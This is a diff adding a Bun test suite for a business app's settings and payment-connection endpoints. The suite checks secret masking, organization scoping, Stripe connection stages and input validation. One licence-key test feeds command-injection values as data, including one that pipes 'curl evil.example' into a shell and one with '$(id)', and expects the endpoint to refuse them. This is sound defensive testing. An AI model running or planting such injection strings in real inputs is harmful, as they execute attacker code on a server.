@@ -1,0 +1,814 @@
+import { afterAll, beforeAll, expect, test } from "bun:test";
+import { auth } from "@sentrello/auth";
+import { signUpAsOwner } from "@sentrello/auth/testing";
+import { db, schema } from "@sentrello/db";
+import { registerForTest } from "@sentrello/module-sdk";
+import { eq } from "drizzle-orm";
+import settings, { maskTaxId } from "./index";
+
+const suffix = crypto.randomUUID().slice(0, 8);
+const email = `settings-${suffix}@example.test`;
+const app = registerForTest(settings);
+
+let orgId: string;
+let headers: Headers;
+
+beforeAll(async () => {
+  const signUp = await signUpAsOwner({
+    email,
+    password: "correct-horse-battery-staple",
+    name: "Owner",
+  });
+  const cookie = signUp.headers.get("set-cookie");
+  if (!cookie) throw new Error("sign-up returned no session cookie");
+  headers = new Headers({ cookie, "content-type": "application/json" });
+
+  const org = await auth.api.createOrganization({
+    body: { name: `Settings ${suffix}`, slug: `settings-${suffix}` },
+    headers,
+  });
+  if (!org) throw new Error("could not create organization");
+  orgId = org.id;
+  await auth.api.setActiveOrganization({
+    body: { organizationId: orgId },
+    headers,
+  });
+});
+
+afterAll(async () => {
+  await db
+    .delete(schema.paymentAccounts)
+    .where(eq(schema.paymentAccounts.organizationId, orgId));
+  await db.delete(schema.member).where(eq(schema.member.organizationId, orgId));
+  await db
+    .delete(schema.organizations)
+    .where(eq(schema.organizations.id, orgId));
+  const [u] = await db
+    .select({ id: schema.user.id })
+    .from(schema.user)
+    .where(eq(schema.user.email, email));
+  if (u) {
+    await db.delete(schema.session).where(eq(schema.session.userId, u.id));
+    await db.delete(schema.account).where(eq(schema.account.userId, u.id));
+    await db.delete(schema.user).where(eq(schema.user.id, u.id));
+  }
+});
+
+async function read(): Promise<unknown> {
+  const res = await app.request("http://localhost/api/settings", { headers });
+  return res.json();
+}
+
+test("it reports whether a secret is set, never the secret", async () => {
+  // A settings page that echoes an API key leaks one over a shoulder, into a
+  // screenshot, or through a support request.
+  process.env.STRIPE_SECRET_KEY = "sk_test_abcdef123456";
+  process.env.STRIPE_WEBHOOK_SECRET = "whsec_supersecret";
+  process.env.RESEND_API_KEY = "re_secret_value";
+  try {
+    const body = (await read()) as Record<string, unknown>;
+    const serialised = JSON.stringify(body);
+
+    expect(serialised).not.toContain("sk_test_abcdef123456");
+    expect(serialised).not.toContain("whsec_supersecret");
+    expect(serialised).not.toContain("re_secret_value");
+
+    const payments = body.payments as {
+      stripe: {
+        configured: boolean;
+        webhookConfigured: boolean;
+        testMode: boolean;
+      };
+    };
+    expect(payments.stripe.configured).toBe(true);
+    expect(payments.stripe.webhookConfigured).toBe(true);
+    expect(payments.stripe.testMode).toBe(true);
+  } finally {
+    process.env.STRIPE_SECRET_KEY = "";
+    process.env.STRIPE_WEBHOOK_SECRET = "";
+    process.env.RESEND_API_KEY = "";
+  }
+});
+
+test("a half-configured Stripe is reported as half-configured", async () => {
+  // Keys without a webhook is the state that charges cards and records
+  // nothing, so it must not read as "set up".
+  process.env.STRIPE_SECRET_KEY = "sk_live_something";
+  process.env.STRIPE_WEBHOOK_SECRET = "";
+  try {
+    const body = (await read()) as {
+      payments: {
+        stripe: {
+          configured: boolean;
+          webhookConfigured: boolean;
+          testMode: boolean;
+        };
+      };
+    };
+    expect(body.payments.stripe.configured).toBe(true);
+    expect(body.payments.stripe.webhookConfigured).toBe(false);
+    expect(body.payments.stripe.testMode).toBe(false);
+  } finally {
+    process.env.STRIPE_SECRET_KEY = "";
+  }
+});
+
+test("each processor is given one address, the platform's own", async () => {
+  const body = (await read()) as {
+    payments: {
+      stripe: { webhookUrl: string };
+      paypal: { webhookUrl: string };
+    };
+  };
+  /*
+   * One each, and the same one the connect screen registers automatically.
+   * The screen used to offer an invoice address while the automatic setup
+   * registered a shop one, so whichever route a business took, half of what it
+   * sold was confirmed by nobody.
+   */
+  expect(body.payments.stripe.webhookUrl).toContain(
+    "/api/payments/webhook/stripe",
+  );
+  expect(body.payments.paypal.webhookUrl).toContain(
+    "/api/payments/webhook/paypal",
+  );
+});
+
+test("renaming the business sticks", async () => {
+  const res = await app.request("http://localhost/api/settings", {
+    method: "PUT",
+    headers,
+    body: JSON.stringify({ name: "Northfield Joinery" }),
+  });
+  expect(res.status).toBe(200);
+
+  const [org] = await db
+    .select()
+    .from(schema.organizations)
+    .where(eq(schema.organizations.id, orgId));
+  expect(org?.name).toBe("Northfield Joinery");
+});
+
+test("an empty or absurd name is refused", async () => {
+  for (const name of ["", "   ", "x".repeat(200)]) {
+    const res = await app.request("http://localhost/api/settings", {
+      method: "PUT",
+      headers,
+      body: JSON.stringify({ name }),
+    });
+    expect(res.status).toBe(400);
+  }
+});
+
+test("settings are not readable without a session", async () => {
+  const res = await app.request("http://localhost/api/settings");
+  expect(res.status).toBe(401);
+});
+
+/**
+ * The business identity that appears on every document a customer receives.
+ *
+ * A name alone is not a valid invoice in the UK or the EU, and a business paid
+ * by transfer whose invoices omit its bank details answers "where do I send
+ * this?" on every one. These are stored so the portal footer can carry them.
+ */
+test("the business can record its address, tax number and payment details", async () => {
+  const res = await app.request("http://localhost/api/settings", {
+    method: "PUT",
+    headers,
+    body: JSON.stringify({
+      name: "Wierzbicki Tiling",
+      address: "Unit 4, Tanners Yard\nLeeds LS9 8AB",
+      taxIdLabel: "VAT number",
+      taxId: "GB 412 7749 02",
+      paymentInstructions: "Bank transfer to 20-45-11, account 8842 3901.",
+    }),
+  });
+  expect(res.status).toBe(200);
+
+  const read = await app.request("http://localhost/api/settings", { headers });
+  const body = (await read.json()) as {
+    business: {
+      address: string;
+      taxId: string;
+      taxIdLabel: string;
+      paymentInstructions: string;
+    };
+  };
+  expect(body.business.address).toContain("Tanners Yard");
+  expect(body.business.taxIdLabel).toBe("VAT number");
+  expect(body.business.paymentInstructions).toContain("20-45-11");
+
+  /**
+   * The tax number comes back masked, and stays stored.
+   *
+   * It is the one field here worth stealing on its own, so the screen is shown
+   * the last four characters the way an SSN is shown anywhere else. The number
+   * itself still reaches an invoice — that is rendered on the server.
+   */
+  expect(body.business.taxId).toBe(maskTaxId("GB 412 7749 02"));
+  expect(body.business.taxId).not.toContain("412");
+  expect(body.business.taxId.endsWith("9 02")).toBe(true);
+
+  /**
+   * And saving the form again does not wipe it.
+   *
+   * The screen can only send back what it was given, so a mask returned
+   * unchanged has to mean "leave it" — or every edit to the address would
+   * quietly delete the tax number.
+   */
+  const again = await app.request("http://localhost/api/settings", {
+    method: "PUT",
+    headers,
+    body: JSON.stringify({
+      name: "Wierzbicki Tiling",
+      address: "Unit 5, Tanners Yard\nLeeds LS9 8AB",
+      taxIdLabel: "VAT number",
+      taxId: body.business.taxId,
+      paymentInstructions: "Bank transfer to 20-45-11, account 8842 3901.",
+    }),
+  });
+  expect(again.status).toBe(200);
+  const [org] = await db
+    .select({ taxId: schema.organizations.taxId })
+    .from(schema.organizations)
+    .where(eq(schema.organizations.id, orgId));
+  expect(org?.taxId).toBe("GB 412 7749 02");
+});
+
+test("a short tax number is still not handed to the browser whole", () => {
+  expect(maskTaxId("12345678")).toBe("\u2022\u2022\u2022\u20225678");
+  expect(maskTaxId("")).toBe("");
+  expect(maskTaxId(null)).toBe("");
+  // Four characters or fewer have nothing left to hide behind.
+  expect(maskTaxId("1234")).toBe("1234");
+});
+
+test("blanking a field clears it rather than storing an empty string", async () => {
+  await app.request("http://localhost/api/settings", {
+    method: "PUT",
+    headers,
+    body: JSON.stringify({ name: "Wierzbicki Tiling", address: "   " }),
+  });
+  const read = await app.request("http://localhost/api/settings", { headers });
+  const body = (await read.json()) as { business: { address: string } };
+  expect(body.business.address).toBe("");
+});
+
+test("an address longer than a document is refused", async () => {
+  const res = await app.request("http://localhost/api/settings", {
+    method: "PUT",
+    headers,
+    body: JSON.stringify({
+      name: "Wierzbicki Tiling",
+      address: "x".repeat(501),
+    }),
+  });
+  expect(res.status).toBe(400);
+  expect(((await res.json()) as { error: string }).error).toContain("address");
+});
+
+/**
+ * Settings name the business and carry what appears on its invoices, so a
+ * scoping slip here would show one business another's address and bank
+ * details — and let it rename them.
+ */
+test("another organization's settings cannot be read or written", async () => {
+  const theirs = `other-org-${crypto.randomUUID().slice(0, 8)}`;
+  await db.insert(schema.organizations).values({
+    id: theirs,
+    name: "Their Secret Trading Name",
+    slug: theirs,
+    createdAt: new Date(),
+    address: "Their Private Address",
+  });
+
+  const read = await app.request("http://localhost/api/settings", { headers });
+  const body = await read.text();
+  expect(body).not.toContain("Their Secret Trading Name");
+  expect(body).not.toContain("Their Private Address");
+
+  // Writing goes to the session's own organization, whatever is asked for.
+  await app.request("http://localhost/api/settings", {
+    method: "PUT",
+    headers,
+    body: JSON.stringify({ name: "Renamed", organizationId: theirs }),
+  });
+  const [untouched] = await db
+    .select()
+    .from(schema.organizations)
+    .where(eq(schema.organizations.id, theirs));
+  expect(untouched?.name).toBe("Their Secret Trading Name");
+
+  await db
+    .delete(schema.organizations)
+    .where(eq(schema.organizations.id, theirs));
+});
+
+/**
+ * The update button.
+ *
+ * The app cannot update itself — it lives in the container being replaced — so
+ * these cover what it is allowed to do: report a version, and ask. The asking
+ * is guarded harder than the reporting, because replacing the running version
+ * is the most consequential button in the product.
+ */
+test("the update screen reports the running version", async () => {
+  const res = await app.request("http://localhost/api/settings/updates", {
+    headers,
+  });
+  expect(res.status).toBe(200);
+
+  const body = (await res.json()) as {
+    current: string;
+    canApply: boolean;
+    status: { state: string };
+  };
+  expect(body.current).toBeTruthy();
+  // No agent in a test process, so the screen must not offer a dead button.
+  expect(body.canApply).toBe(false);
+  expect(body.status.state).toBe("idle");
+});
+
+test("an instance with no agent refuses rather than pretending", async () => {
+  const res = await app.request("http://localhost/api/settings/updates", {
+    method: "POST",
+    headers,
+    body: "{}",
+  });
+  // Either it could not reach the licence server, or there is no agent. Both
+  // are honest refusals; what must never happen is a 202 that goes nowhere.
+  expect([503, 409]).toContain(res.status);
+  expect(res.status).not.toBe(202);
+});
+
+test("rollback refuses when there is nowhere to go back to", async () => {
+  const res = await app.request("http://localhost/api/settings/rollback", {
+    method: "POST",
+    headers,
+    body: "{}",
+  });
+  // No recorded previous version and no agent. Either refusal is honest; a 202
+  // would be a promise to restart the business and then do nothing.
+  expect(res.status).toBe(409);
+  expect(res.status).not.toBe(202);
+});
+
+/**
+ * Entering a licence key from the app. The value reaches a root command line
+ * on the customer's own server, so what this endpoint refuses matters more
+ * than what it accepts.
+ */
+test("a malformed licence key is refused before it is stored", async () => {
+  for (const evil of [
+    'SENT-AAAA-BBBB-CCCC-DDDD"; curl evil.example | sh',
+    "SENT-AAAA-BBBB-CCCC-$(id)",
+    "not-a-key",
+    "",
+  ]) {
+    const res = await app.request("http://localhost/api/settings/license", {
+      method: "POST",
+      headers,
+      body: JSON.stringify({ key: evil }),
+    });
+    expect(res.status).toBe(400);
+  }
+});
+
+test("a key set on the server is not replaced from a browser", async () => {
+  process.env.SENTRELLO_LICENSE_KEY = "SENT-AAAA-BBBB-CCCC-DDDD";
+  const res = await app.request("http://localhost/api/settings/license", {
+    method: "POST",
+    headers,
+    body: JSON.stringify({ key: "SENT-4QGE-M9EP-PRTX-ZGWY" }),
+  });
+  process.env.SENTRELLO_LICENSE_KEY = "";
+  // The server is the more privileged of the two places a key can live.
+  expect(res.status).toBe(409);
+});
+
+test("syncing without a licence key says so rather than pretending", async () => {
+  const res = await app.request("http://localhost/api/settings/sync", {
+    method: "POST",
+    headers,
+    body: "{}",
+  });
+  expect(res.status).toBe(409);
+  expect(res.status).not.toBe(202);
+});
+
+/**
+ * Connecting a card processor from a screen, not from a file on a server.
+ *
+ * The previous answer to "how do I take card payments for an invoice" was
+ * three environment variables and a restart, which the owner of a small
+ * business is never going to do. What has to hold: the secret goes in, never
+ * comes back out, and nothing goes live until it has been proven.
+ */
+test("keys are stored sealed and never returned", async () => {
+  const saved = await app.request(
+    "http://localhost/api/payments/accounts/stripe/test",
+    {
+      method: "PUT",
+      headers,
+      body: JSON.stringify({
+        publicKey: "pk_test_visible",
+        secretKey: "sk_test_51ExampleSecretKey",
+        webhookSecret: "whsec_example",
+      }),
+    },
+  );
+  expect(saved.status).toBe(200);
+  const body = await saved.text();
+  // Not in the reply, in any shape.
+  expect(body).not.toContain("sk_test_51ExampleSecretKey");
+  expect(body).not.toContain("whsec_example");
+  // The publishable half is not a secret and is shown as it is.
+  expect(body).toContain("pk_test_visible");
+
+  const listed = await app.request("http://localhost/api/payments/accounts", {
+    headers,
+  });
+  const shown = await listed.text();
+  expect(shown).not.toContain("sk_test_51ExampleSecretKey");
+  // Enough to recognise your own key, useless to anybody else.
+  expect(shown).toContain("Key");
+
+  // And what is written down is not the key itself.
+  const [row] = await db
+    .select()
+    .from(schema.paymentAccounts)
+    .where(eq(schema.paymentAccounts.organizationId, orgId));
+  expect(row?.secretKey).not.toBe("sk_test_51ExampleSecretKey");
+  expect(row?.secretKey?.length).toBeGreaterThan(0);
+});
+
+test("nothing goes live until the connection has been proven", async () => {
+  /*
+   * The separate "turn it on" route is gone — connecting is one press now, and
+   * a route nothing calls is a route nobody maintains. The property it guarded
+   * is unchanged and matters as much: an instance switched on with keys the
+   * processor has not accepted is one whose first real customer meets an error
+   * at the moment they try to pay.
+   *
+   * So it is asserted where it now lives. The key stored above is not a real
+   * one, Stripe refuses it, and the connection stops there.
+   */
+  const refused = await app.request(
+    "http://localhost/api/payments/accounts/stripe/test/connect",
+    { method: "POST", headers },
+  );
+  expect(refused.status).toBe(409);
+
+  const body = (await refused.json()) as {
+    steps: { step: string; ok: boolean }[];
+  };
+  expect(
+    body.steps.some((s) => s.step.includes("check the keys") && !s.ok),
+  ).toBe(true);
+  // Nothing after the failing stage ran.
+  expect(body.steps.some((s) => s.step.includes("start taking payments"))).toBe(
+    false,
+  );
+
+  const [row] = await db
+    .select()
+    .from(schema.paymentAccounts)
+    .where(eq(schema.paymentAccounts.organizationId, orgId));
+  expect(row?.enabled).toBe(false);
+});
+
+test("changing the key throws away what the last test proved", async () => {
+  // Whatever the previous test said, it was about a different key.
+  await db
+    .update(schema.paymentAccounts)
+    .set({ lastTestOk: true, lastTestMessage: "connected as Acme" })
+    .where(eq(schema.paymentAccounts.organizationId, orgId));
+
+  await app.request("http://localhost/api/payments/accounts/stripe/test", {
+    method: "PUT",
+    headers,
+    body: JSON.stringify({ secretKey: "sk_test_AnotherKeyEntirely" }),
+  });
+
+  const [row] = await db
+    .select()
+    .from(schema.paymentAccounts)
+    .where(eq(schema.paymentAccounts.organizationId, orgId));
+  expect(row?.lastTestOk).toBeNull();
+  expect(row?.enabled).toBe(false);
+});
+
+/**
+ * The environment fallback, which was silent and is not any more.
+ *
+ * Pro charges through `STRIPE_SECRET_KEY` when no connection is saved —
+ * deliberately, so an instance taking payments yesterday keeps taking them
+ * today. On 2026-09-05 that meant an instance had been charging cards into a
+ * different company's Stripe account with nothing on any screen saying so.
+ * Nobody had done anything wrong; there was nowhere to see it.
+ */
+
+test("the screen names the account an environment key belongs to", async () => {
+  // A stand-in Stripe, so this exercises the real request path without one.
+  const stripe = Bun.serve({
+    port: 0,
+    fetch: () =>
+      Response.json({
+        id: "acct_1KEGdrA9N7GcPpMP",
+        business_profile: { name: "Some Other Company" },
+      }),
+  });
+  const previousBase = process.env.STRIPE_API_BASE;
+  const previousKey = process.env.STRIPE_SECRET_KEY;
+  process.env.STRIPE_API_BASE = `http://localhost:${stripe.port}`;
+  process.env.STRIPE_SECRET_KEY = "sk_test_51ExampleEnvironmentKeyABCD";
+
+  try {
+    const res = await app.request("http://localhost/api/payments/accounts", {
+      headers,
+    });
+    const body = (await res.json()) as {
+      environmentFallback: {
+        account: string | null;
+        hint: string;
+        live: boolean;
+      } | null;
+    };
+    // Naming the business is the whole point. "An environment variable is in
+    // use" tells nobody whether it is the right one.
+    expect(body.environmentFallback?.account).toBe("Some Other Company");
+    expect(body.environmentFallback?.hint).toBe("ABCD");
+    expect(body.environmentFallback?.live).toBe(false);
+  } finally {
+    stripe.stop(true);
+    process.env.STRIPE_API_BASE = previousBase;
+    process.env.STRIPE_SECRET_KEY = previousKey;
+    process.env.STRIPE_API_BASE = previousBase;
+    process.env.STRIPE_SECRET_KEY = previousKey;
+  }
+});
+
+test("an enabled connection means there is nothing to warn about", async () => {
+  const previousKey = process.env.STRIPE_SECRET_KEY;
+  process.env.STRIPE_SECRET_KEY = "sk_test_51ExampleEnvironmentKeyABCD";
+  await db
+    .update(schema.paymentAccounts)
+    .set({ enabled: true })
+    .where(eq(schema.paymentAccounts.organizationId, orgId));
+
+  try {
+    const res = await app.request("http://localhost/api/payments/accounts", {
+      headers,
+    });
+    const body = (await res.json()) as { environmentFallback: unknown };
+    // The saved connection wins, so the environment is never read and the
+    // warning would be a lie.
+    expect(body.environmentFallback).toBeNull();
+  } finally {
+    await db
+      .update(schema.paymentAccounts)
+      .set({ enabled: false })
+      .where(eq(schema.paymentAccounts.organizationId, orgId));
+    process.env.STRIPE_SECRET_KEY = previousKey;
+  }
+});
+
+test("no environment key means no warning", async () => {
+  const previousKey = process.env.STRIPE_SECRET_KEY;
+  process.env.STRIPE_SECRET_KEY = undefined;
+  try {
+    const res = await app.request("http://localhost/api/payments/accounts", {
+      headers,
+    });
+    expect(
+      ((await res.json()) as { environmentFallback: unknown })
+        .environmentFallback,
+    ).toBeNull();
+  } finally {
+    process.env.STRIPE_SECRET_KEY = previousKey;
+  }
+});
+
+/**
+ * Connecting in one press, and refusing to go halfway.
+ *
+ * The old shape was three buttons in an order nobody was told — save, test,
+ * turn on — and every pair had a state in between that looks like a fault.
+ * What James actually hit: paste a webhook secret, press the third button, and
+ * be told a webhook secret is needed. True of the database, and a lie about
+ * what he was looking at.
+ *
+ * The property that matters is not "it is easier". It is that **a processor is
+ * never switched on because a later step papered over an earlier one.** Taking
+ * money the shop cannot confirm is the worst outcome this screen has, so the
+ * first failure stops everything after it.
+ */
+test("connecting reports each stage and stops at the first failure", async () => {
+  await app.request("http://localhost/api/payments/accounts/stripe/test", {
+    method: "PUT",
+    headers,
+    body: JSON.stringify({
+      publicKey: "pk_test_visible",
+      secretKey: "sk_test_definitely_not_a_real_key",
+    }),
+  });
+
+  const res = await app.request(
+    "http://localhost/api/payments/accounts/stripe/test/connect",
+    { method: "POST", headers },
+  );
+
+  // Stripe will not accept that key, so the connection is refused.
+  expect(res.status).toBe(409);
+  const body = (await res.json()) as {
+    steps: { step: string; ok: boolean }[];
+  };
+
+  // Named stages rather than one flat failure: a wrong key is not an
+  // unreachable instance, and telling somebody only that "it did not work"
+  // makes them re-paste a key that was fine.
+  expect(body.steps[0]?.step).toContain("check the keys");
+  expect(body.steps[0]?.ok).toBe(false);
+  // Nothing after the failure ran.
+  expect(body.steps.some((s) => s.step.includes("start taking payments"))).toBe(
+    false,
+  );
+
+  // And the shop is not taking payments on a key the processor rejected.
+  const [row] = await db
+    .select()
+    .from(schema.paymentAccounts)
+    .where(eq(schema.paymentAccounts.organizationId, orgId));
+  expect(row?.enabled).toBe(false);
+});
+
+/**
+ * A refusal has to carry its reason, not just its number.
+ *
+ * Written because of what it cost. The route did exactly the right thing —
+ * checked the keys, found the instance had no address the processor could
+ * reach, refused with a sentence saying to paste the signing secret by hand —
+ * and the screen showed "Something went wrong. Try again.", because the body of
+ * a 409 carried `steps` and no `error`, and the client falls back to a generic
+ * line when there is no `error` to read.
+ *
+ * The server being right while the screen is useless is worse than either being
+ * wrong alone: it sends somebody looking for a fault that is not there.
+ */
+test("a refusal says why, in a field any caller reads", async () => {
+  await app.request("http://localhost/api/payments/accounts/stripe/test", {
+    method: "PUT",
+    headers,
+    body: JSON.stringify({ secretKey: "sk_test_not_a_real_key_at_all" }),
+  });
+
+  const res = await app.request(
+    "http://localhost/api/payments/accounts/stripe/test/connect",
+    { method: "POST", headers },
+  );
+  expect(res.ok).toBe(false);
+
+  const body = (await res.json()) as {
+    error?: string;
+    steps: { step: string; ok: boolean; detail?: string }[];
+  };
+  // Both, deliberately: the stages for a screen that can draw them, and one
+  // sentence for everything else.
+  expect(body.steps.length).toBeGreaterThan(0);
+  expect(typeof body.error).toBe("string");
+  expect(body.error?.length).toBeGreaterThan(0);
+});
+
+test("connecting refuses without keys rather than pretending", async () => {
+  await db
+    .delete(schema.paymentAccounts)
+    .where(eq(schema.paymentAccounts.organizationId, orgId));
+
+  const res = await app.request(
+    "http://localhost/api/payments/accounts/stripe/test/connect",
+    { method: "POST", headers },
+  );
+  expect(res.status).toBe(400);
+  expect(await res.text()).toContain("paste the keys first");
+});
+
+/**
+ * Where the business is, in time.
+ *
+ * Anything that acts at a time of day depends on it, and a name the runtime
+ * cannot resolve does not fail loudly — every calculation quietly falls back to
+ * the server's own. So a business that typed "EST" would find its Monday chases
+ * going out at the wrong hour with nothing anywhere saying why, which is why it
+ * is refused at the door instead.
+ */
+test("a timezone is saved, and one the server does not know is refused", async () => {
+  const good = await app.request("http://localhost/api/settings", {
+    method: "PUT",
+    headers,
+    body: JSON.stringify({ name: "A business", timezone: "America/New_York" }),
+  });
+  expect(good.status).toBe(200);
+  expect(
+    ((await good.json()) as { business: { timezone: string } }).business
+      .timezone,
+  ).toBe("America/New_York");
+
+  const bad = await app.request("http://localhost/api/settings", {
+    method: "PUT",
+    headers,
+    body: JSON.stringify({ name: "A business", timezone: "EST (New York)" }),
+  });
+  expect(bad.status).toBe(400);
+  expect(((await bad.json()) as { error: string }).error).toContain(
+    "not a timezone",
+  );
+
+  // And the one that was already saved is untouched by the refusal.
+  const seen = await app.request("http://localhost/api/settings", { headers });
+  expect(
+    ((await seen.json()) as { business: { timezone: string } }).business
+      .timezone,
+  ).toBe("America/New_York");
+});
+
+/**
+ * Clearing a signing secret, which is the advice the connect step gives.
+ *
+ * A secret belonging to an endpoint somebody replaced refuses every event
+ * that arrives, and the only cure is a fresh endpoint with a fresh secret.
+ * The screen said to clear it; nothing could.
+ */
+test("a blank field leaves the signing secret alone, and null clears it", async () => {
+  await app.request("http://localhost/api/payments/accounts/stripe/test", {
+    method: "PUT",
+    headers,
+    body: JSON.stringify({ webhookSecret: "whsec_from_an_old_endpoint" }),
+  });
+  const stored = async () => {
+    const [row] = await db
+      .select({ secret: schema.paymentAccounts.webhookSecret })
+      .from(schema.paymentAccounts)
+      .where(eq(schema.paymentAccounts.organizationId, orgId));
+    return row?.secret ?? null;
+  };
+  expect(await stored()).not.toBeNull();
+
+  // A form posts an empty field for "I did not touch this".
+  await app.request("http://localhost/api/payments/accounts/stripe/test", {
+    method: "PUT",
+    headers,
+    body: JSON.stringify({ webhookSecret: "" }),
+  });
+  expect(await stored()).not.toBeNull();
+
+  // Saying null is saying it deliberately.
+  await app.request("http://localhost/api/payments/accounts/stripe/test", {
+    method: "PUT",
+    headers,
+    body: JSON.stringify({ webhookSecret: null }),
+  });
+  expect(await stored()).toBeNull();
+});
+
+/**
+ * A stranger's body, buffered before anybody can be believed.
+ *
+ * This endpoint is public — a card processor sends no session and no origin
+ * — and the signature is over the raw body, so the body has to be in hand
+ * before anything about the caller can be trusted. Buffering whatever
+ * arrives is the one thing this route cannot avoid doing for a stranger,
+ * which is exactly why the amount has to be bounded. It was not.
+ */
+test("a webhook body too large to be one is refused before it is read", async () => {
+  /*
+   * A business that takes cards, because the route answers 404 to an instance
+   * that does not — cheaply, before reading anything, which is right. Without
+   * this the test passes on that 404 and says nothing about the cap it is
+   * named after.
+   */
+  // Another test in this file connects one too, and the table is unique per
+  // business and provider.
+  await db
+    .delete(schema.paymentAccounts)
+    .where(eq(schema.paymentAccounts.organizationId, orgId));
+  await db.insert(schema.paymentAccounts).values({
+    organizationId: orgId,
+    provider: "stripe",
+    enabled: true,
+    mode: "test",
+    webhookSecret: "whsec_not_a_real_one",
+  });
+
+  try {
+    const res = await app.request(
+      "http://localhost/api/payments/webhook/stripe",
+      { method: "POST", body: "x".repeat(300 * 1024) },
+    );
+    expect(res.status).toBe(413);
+  } finally {
+    await db
+      .delete(schema.paymentAccounts)
+      .where(eq(schema.paymentAccounts.organizationId, orgId));
+  }
+});
